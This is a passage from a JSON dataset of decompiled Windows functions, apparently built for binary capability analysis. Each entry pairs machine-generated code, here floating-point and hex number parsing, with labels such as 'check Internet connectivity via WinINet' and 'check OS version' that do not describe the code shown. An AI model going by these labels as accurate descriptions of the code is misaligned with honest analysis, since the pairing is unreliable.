uVar17 = uVar14;\n                            fcn.140014950(uVar14, arg1_01);\n                            if (CONCAT44(uVar36, uVar35) < extraout_XMM0_Qa) {\n                                dVar28 = extraout_XMM0_Qa * *0x1400180f0;\n                                uVar30 = SUB84(dVar28, 0);\n                                uVar31 = dVar28 >> 0x20;\n                                uStack212 = (-(uVar19 == 0) & 0x10) + 0x10;\n                                uVar19 = uVar19 == 0;\n                                if (*0x1400180f8 <= dVar28) {\n                                    iStack264 = 0;\n                                    uVar26 = 0;\n                                }\n                                else {\n                                    iStack264 = dVar28;\n                                    dVar32 = iStack264;\n                                    dVar29 = dVar28 - dVar32;\n                                    uVar30 = SUB84(dVar29, 0);\n                                    uVar31 = dVar29 >> 0x20;\n                                    dVar28 = dVar32;\n                                    if (uStack248 == 1) {\n                                        if (uVar19 != 0) {\ncode_r0x0001400122f4:\n                                            if (*0x140018100 < dVar29) goto code_r0x0001400122fe;\n                                        }\ncode_r0x0001400122e5:\n                                        uVar26 = 0;\n                                    }\n                                    else if (uStack248 == 2) {\n                                        if (uVar19 == 0) goto code_r0x0001400122f4;\n                                        uVar26 = 0;\n                                    }\n                                    else {\n                                        if (dVar29 < *0x1400180f0) goto code_r0x0001400122e5;\ncode_r0x0001400122fe:\n                                        iStack264 = iStack264 + 1;\n                                        uStack212 = 0x30 - uStack212;\n                                        uVar26 = 0;\n                                        dVar28 = iStack264;\n                                    }\n                                }\n                            }\n                            else {\n                                if (uVar19 == 0) {\n                                    uVar26 = 0;\n                                    uVar30 = uVar33;\n                                    uVar31 = uVar34;\n                                    goto code_r0x000140011b5c;\n                                }\n                                iStack264 = 0;\n                                uVar26 = 0;\n                                uVar19 = 0;\n                                uStack212 = 0x20;\n                                uVar30 = SUB84(*0x1400180e0, 0);\n                                uVar31 = *0x1400180e0 >> 0x20;\n                                dVar28 = *0x1400180e0;\n                            }\n                            goto code_r0x000140011b8e;\n                        }\n                        if (uVar19 != 0) {\n                            if (uStack276 == 0) goto code_r0x0001400129db;\n                            puVar16 = auStack160[0] + 0x18;\n                            goto code_r0x000140012802;\n                        }\n                        if (uVar21 != 1) {\n                            uStack180 = 0x21;\n                            goto code_r0x000140012964;\n                        }\n                        uStack180 = 1;\n                        if (uStack204 == uVar7) {\n                            uStack180 = 0x21;\n                            if ((*(auStack160[0] + 0x14) == 1) && (uVar24 = uVar21,  *(auStack160[0] + 0x18) != 1)) {\n                                uVar24 = uStack208;\n                            }\n                            goto code_r0x0001400113c0;\n                        }\n                    }\n                    uStack172 = uStack172 - uVar1;\n                    uStack176 = uVar1;\n                    auStack160[0] = fcn.140010e10(auStack160[0], uVar1);\n                    goto code_r0x0001400113c0;\n                }\n                uVar20 = uStack248 & 1;\n                uVar26 = uVar20 ^ uVar19;\n                if (uVar20 == uVar19) {\n                    uStack180 = (-(uVar20 == 0) & 0x10) + 0x11;\n                    goto code_r0x0001400113c0;\n                }\n                if (uVar19 != 0) {\n                    uVar19 = 0;\n                    uStack180 = 0x21;\n                    iStack264 = 0;\n                    uStack212 = 0x20;\n                    uVar30 = SUB84(*0x1400180e0, 0);\n                    uVar31 = *0x1400180e0 >> 0x20;\n                    dVar28 = *0x1400180e0;\n                    goto code_r0x000140011b8e;\n                }\n                uStack180 = 0x11;\n                uVar30 = uVar33;\n                uVar31 = uVar34;\n                if (uStack204 != uVar7) {\n                    uVar20 = uVar1;\n                    if (0x1f < uVar1) {\n                        iVar13 = 1;\n                        do {\n                            uVar19 = *(auStack160[0] + 0x14 + iVar13 * 4);\n                            uVar17 = uVar19;\n                            if (uVar19 != 0) goto code_r0x000140011b5c;\n                            uVar20 = uVar20 - 0x20;\n                            uVar19 = iVar13;\n                            iVar13 = iVar13 + 1;\n                        } while (0x1f < uVar20);\n                    }\n                    if (1 < uVar20) {\n                        puVar16 = auStack160[0] + 0x18 + uVar19 * 4;\n                        uVar27 = 0;\n                        uVar19 = *puVar16;\n                        for (uVar3 = uVar19; (uVar3 & 1) == 0; uVar3 = uVar3 >> 1 | 0x80000000) {\n                            uVar27 = uVar27 + 1;\n                        }\n                        uVar17 = uVar27;\n                        *puVar16 = uVar19 >> (uVar27 & 0x1f);\n                        if (uVar27 < uVar20 - 1) goto code_r0x000140011b5c;\n                    }\n                    uStack172 = uStack204 - 1;\n                    uStack176 = uVar1;\n                    auStack160[0] = fcn.140010e10(auStack160[0], uVar1);\n                    goto code_r0x0001400113c0;\n                }\ncode_r0x000140011b5c:\n                if ((uVar21 < 2) && (uStack276 != 0)) {\n                    uStack276 = 1;\n                    goto code_r0x000140012908;\n                }\n                uVar19 = 1;\n                iStack264 = 0;\n                uStack212 = 0x10;\n                uVar33 = uVar30;\n                uVar34 = uVar31;\n                dVar28 = CONCAT44(uVar31, uVar30);\ncode_r0x000140011b8e:\n                iVar8 = uStack172 + uStack176;\n                if ((uStack176 < uVar1) && (uStack276 == 0)) {\n                    uVar21 = uVar1 - uStack176;\n                    uVar15 = fcn.1400142d0(auStack160[0], uVar21);\n                    uStack172 = uStack172 - uVar21;\n                    uVar17 = auStack160[0];\n                    uStack176 = uVar1;\n                    auStack160[0] = uVar15;\n                }\n                arg1_03 = fcn.140014720(uVar17, &uStack188, auStack184);\n                if (uStack188 < 0) {\n                    fcn.140013570(arg1_03, -uStack188);\n                }\n                else if (uStack188 != 0) {\n                    arg1_03 = fcn.1400142d0(arg1_03, uStack188);\n                }\n                uVar17 = auStack160[0];\n                if (uVar19 == 0) {\n                    auStack160[0] = fcn.140012ab0(auStack160[0], arg1_03);\n                    iVar23 = *(auStack160[0] + 0x14) + -1;\n                    if (*(uVar17 + 0x14) != iVar23 && iVar23 <= *(uVar17 + 0x14)) {\n                        puVar16 = auStack160[0] + 0x18 + iVar23 * 4;\n                        uVar19 = 0x1f;\n                        if (*puVar16 != 0) {\n                            for (; *puVar16 >> uVar19 == 0; uVar19 = uVar19 - 1) {\n                            }\n                        }\n                        puVar16 = uVar17 + 0x18 + iVar23 * 4;\n                        uVar21 = 0x1f;\n                        if (*puVar16 != 0) {\n                            for (; *puVar16 >> uVar21 == 0; uVar21 = uVar21 - 1) {\n                            }\n                        }\n                        if ((uVar21 ^ 0x1f) <= (uVar19 ^ 0x1f)) goto code_r0x000140011c50;\n                    }\n                    if (uStack276 == 0) {\n                        fcn.140013570(auStack160[0], 1);\n                        uStack172 = uStack172 + 1;\n                        uStack204 = uStack204 + 1;\n                        iStack264 = 0;\n                    }\n                    else {\n                        uStack176 = uStack176 + 1;\n                        uStack276 = uStack176 != uVar1;\n                    }\ncode_r0x000140011c50:\n                    fcn.140013d90(arg1_03);\n                    fcn.140013d90(uVar17);\n                    if (uVar26 != 0) goto code_r0x0001400113c0;\n                    if ((uStack176 + uStack172 == iVar8) && (iStack264 != 0)) {\n                        dVar28 = dVar28 * *0x140018108;\n                        dVar29 = CONCAT44(uVar31, uVar30) - *0x1400180f0;\n                        if ((dVar28 ^ SUB168(auVar37, 0)) <= dVar29) {\n                            if ((dVar28 < dVar29) &&\n                               (CONCAT44(uVar31, uVar30) <= *0x1400180e0 - dVar28 &&\n                                *0x1400180e0 - dVar28 != CONCAT44(uVar31, uVar30))) goto code_r0x0001400113b0;\n                        }\n                        else if (dVar28 <= CONCAT44(uVar31, uVar30) && CONCAT44(uVar31, uVar30) != dVar28)\n                        goto code_r0x0001400113b0;\n                    }\n                    if (uStack276 == 0) goto code_r0x00014001224a;\n                }\n                else {\n                    auStack160[0] = fcn.140014430(auStack160[0], arg1_03);\n                    if (uStack276 != 0) goto code_r0x000140011c50;\n                    iVar23 = *(uVar17 + 0x14) + -1;\n                    if (*(auStack160[0] + 0x14) != iVar23 && iVar23 <= *(auStack160[0] + 0x14)) {\n                        puVar16 = auStack160[0] + 0x18 + iVar23 * 4;\n                        uVar21 = 0x1f;\n                        if (*puVar16 != 0) {\n                            for (; *puVar16 >> uVar21 == 0; uVar21 = uVar21 - 1) {\n                            }\n                        }\n                        puVar16 = uVar17 + 0x18 + iVar23 * 4;\n                        uVar20 = 0x1f;\n                        if (*puVar16 != 0) {\n                            for (; *puVar16 >> uVar20 == 0; uVar20 = uVar20 - 1) {\n                            }\n                        }\n                        if ((uVar21 ^ 0x1f) <= (uVar20 ^ 0x1f)) goto code_r0x000140011c50;\n                    }\n                    if (uStack204 == uVar7) {\n                        uStack176 = uStack176 - 1;\n                        uStack276 = uVar19;\n                        goto code_r0x000140011c50;\n                    }\n                    auStack160[0] = fcn.1400142d0(auStack160[0], 1);\n                    uStack172 = uStack172 - 1;\n                    uStack204 = uStack204 - 1;\n                    fcn.140013d90(arg1_03);\n                    fcn.140013d90(uVar17);\ncode_r0x00014001224a:\n                    uVar26 = fcn.140013670(auStack160[0]);\n                    uStack276 = 0;\n                }\n                fcn.140013d90(arg1_02);\n                fcn.140013d90(arg1_00);\n                fcn.140013d90(arg1_01);\n                fcn.140013d90(uVar14);\n            } while( true );\n        }\n        if (uVar7 <= uStack204 + 1) {\n            uStack276 = 1;\n            uStack204 = uVar7;\n            uStack172 = uVar7;\n            goto code_r0x0001400118d5;\n        }\n        *(auStack160[0] + 0x14) = 0;\n        *arg4 = uVar7;\n        uVar14 = auStack160[0];\n        uStack172 = uVar7;\n        goto code_r0x0001400123e0;\n    }\n    if (uVar18 == 0) goto code_r0x000140011898;\n    uStack176 = uStack176 + uVar18;\n    if (0 < uStack176) {\n        fcn.140013570(auStack160[0], uVar7 - uStack172);\n        goto code_r0x000140011898;\n    }\n    if (-2 < uStack176) {\n        uStack176 = 1;\n        *(auStack160[0] + 0x14) = 0x100000001;\n        goto code_r0x000140011898;\n    }\n    *(auStack160[0] + 0x14) = 0;\n    *arg4 = uVar7;\n    uVar14 = auStack160[0];\n    if (uStack208 != 0) goto code_r0x0001400123e0;\n    uStack180 = 0x50;\n    goto code_r0x000140011534;\ncode_r0x0001400113b0:\n    uStack180 = uStack180 | uStack212;\ncode_r0x0001400113c0:\n    uStack208 = uVar24;\n    uVar9 = uStack176;\n    if (uStack276 == 0) goto code_r0x000140012546;\n    goto code_r0x0001400113d3;\n    while (uVar9 = *puVar16,  puVar16 = puVar16 + 1,  uVar9 == 0xffffffff) {\ncode_r0x000140012802:\n        if (auStack160[0] + 0x18 + (uStack176 >> 5) <= puVar16) {\n            if (((uStack176 & 0x1f) == 0) || ((-1 << (uStack176 & 0x1f) | *puVar16) == 0xffffffff)) {\n                uStack176 = 1;\n                *(auStack160[0] + 0x14) = 0x100000001;\n                uStack180 = 0x21;\n                uStack172 = (uVar1 - 1) + uVar7;\n                uVar9 = uStack276;\n                goto code_r0x000140012546;\n            }\n            break;\n        }\n    }\ncode_r0x0001400129db:\n    uStack180 = 0x11;\ncode_r0x000140012964:\n    if ((uVar1 <= uVar21) || (uVar9 = uStack176,  uStack276 != 0)) {\n        if ((*(auStack160[0] + 0x18) & 1) != 0) {\n            if (uVar19 == 0) {\n                if (uVar21 == 1) {\ncode_r0x000140012908:\n                    *(auStack160[0] + 0x14) = 0;\n                    uStack180 = 0x50;\n                    uStack172 = uVar7;\n                }\n                else {\n                    fcn.140010de0(auStack160[0]);\n                    uStack180 = 0x11;\n                }\n            }\n            else {\n                auStack160[0] = fcn.140010990(auStack160[0]);\n                puVar16 = auStack160[0] + 0x18 + (*(auStack160[0] + 0x14) + -1) * 4;\n                uVar9 = 0x1f;\n                if (*puVar16 != 0) {\n                    for (; *puVar16 >> uVar9 == 0; uVar9 = uVar9 - 1) {\n                    }\n                }\n                if ((-uStack176 & 0x1f) != (uVar9 ^ 0x1f)) {\n                    uStack176 = uStack176 + 1;\n                }\n                uStack180 = 0x21;\n            }\n        }\n        goto code_r0x0001400113c0;\n    }\ncode_r0x000140012546:\n    uStack276 = uVar1 - uVar9;\n    if (uStack276 != 0) {\n        if (uStack276 < 1) {\n            fcn.140013570(auStack160[0], uVar9 - uVar1);\n        }\n        else {\n            auStack160[0] = fcn.1400142d0(auStack160[0], uStack276);\n        }\n        uStack172 = uStack172 - uStack276;\n        uStack276 = 0;\n    }\ncode_r0x0001400113d3:\n    *arg4 = uStack172;\n    fcn.140013d90(arg1_02);\n    fcn.140013d90(arg1_00);\n    fcn.140013d90(arg1_01);\n    fcn.140013d90(iVar12);\n    fcn.140013d90(uVar14);\n    uVar14 = auStack160[0];\n    if (arg3[2] < uStack172) {\n        uVar9 = arg3[3] & 3;\n        if (uVar9 == 2) {\n            if (iStack244 == 0) goto code_r0x000140012458;\n        }\n        else if (uVar9 == 3) {\n            if (iStack244 != 0) goto code_r0x000140012458;\n        }\n        else if (uVar9 == 1) {\ncode_r0x000140012458:\n            uStack180 = 0xa3;\n            *(auStack160[0] + 0x14) = 0;\n            puVar11 = sub.msvcrt.dll__errno();\n            *puVar11 = 0x22;\n            *arg4 = arg3[2] + 1;\n            uVar14 = auStack160[0];\n            goto code_r0x0001400114f0;\n        }\n        fcn.140013d90(auStack160[0]);\n        auStack160[0] = 0;\n        uStack180 = 0x11;\n        *arg4 = arg3[2];\n        uVar9 = *arg3;\n        uVar14 = in_stack_00000028 + (uVar9 + 0x1f >> 5) * 4;\n        if (in_stack_00000028 < uVar14) {\n            sub.msvcrt.dll_memset();\n        }\n        uVar9 = uVar9 & 0x1f;\n        if (uVar9 != 0) {\n            puVar16 = uVar14 - 4;\n            *puVar16 = *puVar16 >> (0x20U - uVar9 & 0x1f);\n        }\n        uVar14 = 0;\n    }\ncode_r0x0001400114f0:\n    if (uStack276 != 0) {\n        if (uStack208 == 0) {\n            uVar9 = uStack180 & 0x30;\n            uStack180 = uStack180 & 0xfffffff8;\n            if (0 < *(uVar14 + 0x14)) {\n                uStack180 = uStack180 | 2;\n            }\n            uVar14 = auStack160[0];\n            if (uVar9 != 0) {\ncode_r0x000140011534:\n                uStack180 = uStack180 | 0x40;\n                puVar11 = sub.msvcrt.dll__errno();\n                *puVar11 = 0x22;\n                uVar14 = auStack160[0];\n            }\n        }\n        else {\ncode_r0x0001400123e0:\n            *(uVar14 + 0x14) = 0;\n            uStack180 = 0x50;\n            puVar11 = sub.msvcrt.dll__errno();\n            *puVar11 = 0x22;\n            uVar14 = auStack160[0];\n        }\n    }\ncode_r0x0001400111b0:\n    if (arg2 != NULL) {\n        *arg2 = pcStack168;\n    }\n    if (iStack244 != 0) {\n        uStack180 = uStack180 | 8;\n    }\ncode_r0x0001400111de:\n    if (uVar14 != 0) {\n        fcn.140014a40(in_stack_00000028, uVar1, uVar14);\n        fcn.140013d90(auStack160[0]);\n    }\n    return uStack180;\n}\n",
        "token_count": 11489
    },
    "140012c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t fcn.140012c40(uint8_t **arg1, uint32_t *arg2, uint32_t *arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    bool bVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint8_t **ppuVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    uint64_t uVar15;\n    uint32_t uVar16;\n    uint8_t *puVar17;\n    uint8_t *puVar18;\n    int32_t iVar19;\n    uint8_t uVar20;\n    uint8_t uVar21;\n    uint32_t *puVar22;\n    int32_t iVar23;\n    uint8_t *puVar24;\n    uint32_t uVar25;\n    int32_t iVar26;\n    uint8_t *puVar27;\n    uint32_t *puVar28;\n    int64_t iVar29;\n    bool bVar30;\n    uint32_t in_stack_00000028;\n    \n    ppuVar10 = sub.msvcrt.dll_localeconv();\n    iVar11 = *0x140018310;\n    puVar5 = *ppuVar10;\n    if (*(*0x140018310 + 0x30) == '\\0') {\n        fcn.1400136c0();\n    }\n    *arg4 = 0;\n    puVar27 = *arg1;\n    uVar21 = puVar27[2];\n    if (uVar21 == 0x30) {\n        puVar24 = puVar27 + 3;\n        do {\n            puVar17 = puVar24;\n            iVar14 = (1 - (puVar27 + 3)) + puVar17;\n            uVar21 = *puVar17;\n            puVar24 = puVar17 + 1;\n        } while (uVar21 == 0x30);\n    }\n    else {\n        puVar17 = puVar27 + 2;\n        iVar14 = 0;\n    }\n    uVar15 = uVar21;\n    uVar3 = *puVar5;\n    if (*(iVar11 + uVar15) != '\\0') {\n        iVar14 = iVar14 + 1;\n        bVar30 = false;\n        puVar27 = NULL;\n        puVar24 = puVar17;\n        goto code_r0x000140012e28;\n    }\n    puVar18 = puVar17;\n    uVar20 = uVar21;\n    puVar27 = puVar17;\n    uVar4 = uVar3;\n    puVar24 = puVar5;\n    if (uVar3 == 0) {\ncode_r0x000140012d16:\n        uVar16 = 0;\n        bVar30 = true;\n        if ((uVar20 & 0xdf) == 0x50) {\ncode_r0x000140012f62:\n            uVar21 = puVar18[1];\n            if (uVar21 == 0x2b) {\n                iVar23 = 0;\ncode_r0x0001400130de:\n                uVar21 = puVar18[2];\n                puVar24 = puVar18 + 2;\n            }\n            else {\n                if (uVar21 == 0x2d) {\n                    iVar23 = 1;\n                    goto code_r0x0001400130de;\n                }\n                puVar24 = puVar18 + 1;\n                iVar23 = 0;\n            }\n            bVar6 = false;\n            puVar27 = puVar18;\n            if (*(iVar11 + uVar21) - 1 < 0x19) {\n                uVar8 = *(iVar11 + uVar21) - 0x10;\n                uVar21 = puVar24[1];\n                bVar6 = false;\n                while( true ) {\n                    uVar15 = uVar21;\n                    puVar27 = puVar24 + 1;\n                    if (0x18 < *(iVar11 + uVar15) - 1) break;\n                    if ((uVar8 & 0xf8000000) != 0) {\n                        bVar6 = true;\n                    }\n                    uVar21 = puVar24[2];\n                    uVar8 = (*(iVar11 + uVar15) - 0x10) + uVar8 * 10;\n                    puVar24 = puVar27;\n                }\n                if (iVar23 != 0) {\n                    uVar8 = -uVar8;\n                }\n                uVar16 = uVar16 + uVar8;\n            }\n        }\n        else {\n            bVar30 = true;\n            uVar16 = 0;\n            iVar23 = 0;\n            bVar6 = false;\n            puVar27 = puVar18;\n        }\n        if (iVar14 == 0) {\n            puVar27 = puVar17 + -1;\n        }\n        *arg1 = puVar27;\n        if (bVar30) {\n            return 0;\n        }\n        if (bVar6) {\n            uVar16 = arg2[3];\n            if (iVar23 != 0) {\n                if (uVar16 == 2) {\n                    if (in_stack_00000028 != 0) goto code_r0x0001400131dd;\n                }\n                else if ((uVar16 != 3) || (in_stack_00000028 == 0)) goto code_r0x0001400131dd;\n                iVar12 = fcn.140013c90(0);\n                *(iVar12 + 0x14) = 0x100000001;\n                uVar8 = arg2[1];\n                goto code_r0x00014001317a;\n            }\n            if (uVar16 == 2) {\n                if (in_stack_00000028 != 0) goto code_r0x000140012d84;\n            }\n            else if (uVar16 == 3) {\n                if (in_stack_00000028 == 0) goto code_r0x000140012d84;\n            }\n            else if (uVar16 != 1) {\ncode_r0x000140012d84:\n                uVar16 = *arg2 & 0x1f;\n                iVar26 = *arg2 >> 5;\n                iVar19 = (iVar26 + 1) - (uVar16 == 0);\n                uVar15 = 0;\n                iVar14 = iVar19;\n                while (iVar14 = iVar14 >> 1,  iVar14 != 0) {\n                    uVar15 = uVar15 + 1;\n                }\n                iVar11 = fcn.140013c90(uVar15);\n                *arg4 = iVar11;\n                *(iVar11 + 0x14) = iVar19;\n                if (0 < iVar26) {\n                    sub.msvcrt.dll_memset(iVar11 + 0x18, 0xff, iVar26 << 2);\n                    iVar23 = iVar26;\n                }\n                if (iVar26 < iVar19) {\n                    *(iVar11 + 0x18 + iVar23 * 4) = 0x20 >> (-uVar16 & 0x1fU);\n                }\n                *arg3 = arg2[1];\n                return 0x11;\n            }\n            goto code_r0x000140013268;\n        }\n    }\n    else {\n        do {\n            puVar27 = puVar27 + 1;\n            uVar20 = uVar21;\n            if (uVar4 != uVar15) goto code_r0x000140012d16;\n            uVar4 = puVar24[1];\n            uVar20 = *puVar27;\n            uVar15 = uVar20;\n            puVar24 = puVar24 + 1;\n        } while (uVar4 != 0);\n        puVar18 = puVar27;\n        if (*(iVar11 + uVar20) == '\\0') goto code_r0x000140012d16;\n        if (uVar20 == 0x30) {\n            do {\n                uVar21 = puVar18[1];\n                puVar18 = puVar18 + 1;\n            } while (uVar21 == 0x30);\n            bVar30 = *(iVar11 + uVar21) == '\\0';\n            puVar24 = puVar18;\n            if (!bVar30) {\n                iVar14 = 1;\n                puVar17 = puVar18;\n                goto code_r0x000140012e28;\n            }\n            iVar14 = 1;\n            puVar17 = puVar18;\n            if (uVar21 == uVar3) goto code_r0x000140012f41;\ncode_r0x000140012e41:\n            uVar21 = *puVar18;\n            uVar16 = (puVar27 - puVar18) * 4;\n            puVar17 = puVar24;\n            if (puVar27 == NULL) {\n                uVar16 = 0;\n            }\ncode_r0x000140012e57:\n            if ((uVar21 & 0xdf) != 0x50) goto code_r0x000140012e65;\n            goto code_r0x000140012f62;\n        }\n        bVar30 = false;\n        iVar14 = 1;\n        puVar17 = puVar27;\n        puVar24 = puVar27;\ncode_r0x000140012e28:\n        do {\n            puVar2 = puVar17 + 1;\n            puVar18 = puVar17 + 1;\n            puVar17 = puVar18;\n        } while (*(iVar11 + *puVar2) != '\\0');\n        if (*puVar2 != uVar3) goto code_r0x000140012e41;\n        puVar17 = puVar24;\n        if (puVar27 == NULL) {\n            iVar12 = 1;\n            uVar21 = puVar5[1];\n            while (uVar21 != 0) {\n                if (puVar18[iVar12] != uVar21) {\n                    uVar21 = *puVar18;\n                    goto code_r0x000140013244;\n                }\n                iVar12 = iVar12 + 1;\n                uVar21 = puVar5[iVar12];\n            }\n            puVar27 = puVar18 + iVar12;\n            uVar21 = *puVar27;\n            puVar18 = puVar27;\n            if (*(iVar11 + uVar21) == '\\0') {\ncode_r0x000140013244:\n                uVar16 = 0;\n            }\n            else {\n                do {\n                    uVar21 = puVar18[1];\n                    puVar18 = puVar18 + 1;\n                } while (*(iVar11 + uVar21) != '\\0');\n                uVar16 = (puVar27 - puVar18) * 4;\n            }\n            goto code_r0x000140012e57;\n        }\ncode_r0x000140012f41:\n        uVar16 = (puVar27 - puVar18) * 4;\n        if ((*puVar18 & 0xdf) == 0x50) goto code_r0x000140012f62;\ncode_r0x000140012e65:\n        *arg1 = puVar18;\n        if (bVar30) {\n            return 0;\n        }\n    }\n    uVar15 = 0;\n    for (iVar14 = (puVar18 - puVar17) + -1; 7 < iVar14; iVar14 = iVar14 >> 1) {\n        uVar15 = uVar15 + 1;\n    }\n    iVar12 = fcn.140013c90(uVar15);\n    puVar28 = iVar12 + 0x18;\n    if (puVar5[1] == 0) {\n        iVar29 = 0;\n    }\n    else {\n        iVar7 = 1;\n        do {\n            iVar29 = iVar7;\n            iVar7 = iVar29 + 1;\n        } while (puVar5[iVar29 + 1] != 0);\n    }\n    puVar22 = puVar28;\n    if (puVar17 < puVar18) {\n        uVar25 = 0;\n        iVar14 = 0;\n        do {\n            while( true ) {\n                uVar21 = puVar18[-1];\n                puVar27 = puVar18 + -1;\n                if (uVar21 == puVar5[iVar29]) break;\n                if (iVar14 == 0x20) {\n                    *puVar22 = uVar25;\n                    iVar23 = 4;\n                    uVar21 = puVar18[-1];\n                    uVar25 = 0;\n                    puVar22 = puVar22 + 1;\n                    iVar14 = 0;\n                }\n                else {\n                    iVar23 = iVar14 + 4;\n                }\n                uVar25 = uVar25 | (*(iVar11 + uVar21) & 0xf) << (iVar14 & 0x1f);\n                puVar18 = puVar27;\n                iVar14 = iVar23;\n                if (puVar27 <= puVar17) goto code_r0x00014001300f;\n            }\n            puVar18 = puVar27 + -iVar29;\n        } while (puVar17 < puVar18);\ncode_r0x00014001300f:\n        uVar8 = 0x1f;\n        if (uVar25 != 0) {\n            for (; uVar25 >> uVar8 == 0; uVar8 = uVar8 - 1) {\n            }\n        }\n        uVar8 = uVar8 ^ 0x1f;\n    }\n    else {\n        uVar8 = 0x20;\n        uVar25 = 0;\n    }\n    *puVar22 = uVar25;\n    uVar25 = *arg2;\n    iVar14 = puVar22 + (4 - puVar28) >> 2;\n    *(iVar12 + 0x14) = iVar14;\n    iVar14 = iVar14 * 0x20 - uVar8;\n    if (uVar25 < iVar14) {\n        uVar8 = iVar14 - uVar25;\n        uVar9 = fcn.140014ab0(iVar12, uVar8);\n        if (uVar9 != 0) {\n            uVar1 = uVar8 - 1;\n            uVar9 = 1;\n            if ((1 << (uVar1 & 0x1f) & puVar28[uVar1 >> 5]) != 0) {\n                if (uVar1 != 0) {\n                    uVar9 = 3;\n                    iVar14 = fcn.140014ab0(iVar12, uVar1);\n                    if (iVar14 != 0) goto code_r0x0001400132d0;\n                }\n                uVar9 = 2;\n            }\n        }\ncode_r0x0001400132d0:\n        uVar16 = uVar16 + uVar8;\n        fcn.140013570(iVar12, uVar8);\n    }\n    else {\n        uVar9 = 0;\n        if (iVar14 < uVar25) {\n            uVar16 = uVar16 - (uVar25 - iVar14);\n            iVar12 = fcn.1400142d0(iVar12, uVar25 - iVar14);\n            puVar28 = iVar12 + 0x18;\n        }\n    }\n    if (arg2[2] < uVar16) {\ncode_r0x000140013260:\n        fcn.140013d90(iVar12);\ncode_r0x000140013268:\n        puVar13 = sub.msvcrt.dll__errno();\n        *puVar13 = 0x22;\n        return 0xa3;\n    }\n    uVar8 = arg2[1];\n    if (uVar16 < uVar8) {\n        uVar16 = uVar8 - uVar16;\n        if (uVar25 <= uVar16) {\n            uVar9 = arg2[3];\n            if (uVar9 == 2) {\n                if (in_stack_00000028 == 0) goto code_r0x000140013417;\n            }\n            else if (uVar9 == 3) {\n                if (in_stack_00000028 != 0) goto code_r0x000140013417;\n            }\n            else if ((uVar9 == 1) && (uVar25 == uVar16)) {\n                if (uVar25 != 1) {\n                    iVar14 = fcn.140014ab0(iVar12, uVar25 - 1);\n                    if (iVar14 == 0) goto code_r0x0001400131d5;\n                    uVar8 = arg2[1];\n                }\ncode_r0x000140013417:\n                *(iVar12 + 0x14) = 1;\n                *puVar28 = 1;\ncode_r0x00014001317a:\n                *arg4 = iVar12;\n                *arg3 = uVar8;\n                puVar13 = sub.msvcrt.dll__errno();\n                *puVar13 = 0x22;\n                return 0x62;\n            }\ncode_r0x0001400131d5:\n            fcn.140013d90(iVar12);\ncode_r0x0001400131dd:\n            puVar13 = sub.msvcrt.dll__errno();\n            *puVar13 = 0x22;\n            return 0x50;\n        }\n        uVar8 = uVar16 - 1;\n        if (uVar9 == 0) {\n            if (uVar8 != 0) {\n                uVar9 = fcn.140014ab0(iVar12, uVar8);\n            }\n        }\n        else {\n            uVar9 = 1;\n        }\n        if ((1 << (uVar8 & 0x1f) & puVar28[uVar8 >> 5]) != 0) {\n            uVar9 = uVar9 | 2;\n        }\n        uVar25 = uVar25 - uVar16;\n        uVar21 = 2;\n        fcn.140013570(iVar12, uVar16);\n        uVar16 = arg2[1];\n    }\n    else {\n        uVar21 = 1;\n    }\n    if (uVar9 == 0) goto code_r0x000140013087;\n    uVar8 = arg2[3];\n    if (uVar8 == 2) {\n        in_stack_00000028 = 1 - in_stack_00000028;\njoined_r0x000140013381:\n        if (in_stack_00000028 != 0) {\n            iVar14 = *(iVar12 + 0x14);\n            iVar12 = fcn.140010990(iVar12);\n            if (uVar21 == 2) {\n                uVar21 = 0x22;\n                if (*arg2 - 1 == uVar25) {\n                    uVar21 = ((1 << (uVar25 & 0x1f) & *(iVar12 + 0x18 + (uVar25 >> 5) * 4)) == 0) + 0x21;\n                }\n                goto code_r0x000140013087;\n            }\n            if (*(iVar12 + 0x14) == iVar14 || *(iVar12 + 0x14) < iVar14) {\n                if ((uVar25 & 0x1f) != 0) {\n                    puVar28 = iVar12 + 0x14 + iVar14 * 4;\n                    uVar8 = 0x1f;\n                    if (*puVar28 != 0) {\n                        for (; *puVar28 >> uVar8 == 0; uVar8 = uVar8 - 1) {\n                        }\n                    }\n                    if ((uVar8 ^ 0x1f) < 0x20 - (uVar25 & 0x1f)) goto code_r0x0001400133c3;\n                }\n            }\n            else {\ncode_r0x0001400133c3:\n                uVar16 = uVar16 + 1;\n                fcn.140013570(iVar12, 1);\n                if (arg2[2] < uVar16) goto code_r0x000140013260;\n            }\n            uVar21 = 0x21;\n            goto code_r0x000140013087;\n        }\n    }\n    else {\n        if (uVar8 == 3) goto joined_r0x000140013381;\n        if ((uVar8 == 1) && ((uVar9 & 2) != 0)) {\n            in_stack_00000028 = (uVar9 | *puVar28) & 1;\n            goto joined_r0x000140013381;\n        }\n    }\n    uVar21 = uVar21 | 0x10;\ncode_r0x000140013087:\n    *arg4 = iVar12;\n    *arg3 = uVar16;\n    return uVar21;\n}\n",
        "token_count": 4643
    },
    "14001376": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
